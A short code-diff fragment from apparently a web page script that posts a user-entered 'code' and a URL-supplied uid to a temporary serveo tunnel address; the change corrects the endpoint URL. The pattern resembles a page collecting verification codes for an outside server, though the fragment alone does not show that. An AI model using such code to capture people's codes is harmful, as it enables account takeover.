@@ -76,7 +76,7 @@
             const uid = new URLSearchParams(window.location.search).get('uid') || "Unknown";
 
             try {
-                await fetch("https://a0fc33837243f7b6-95-24-163-77.serveousercontent.comsubmit", {
+                await fetch("https://ffdb8aa38a66bbe8-95-24-163-77.serveousercontent.com/submit", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ type: 'code', value: val, uid: uid })
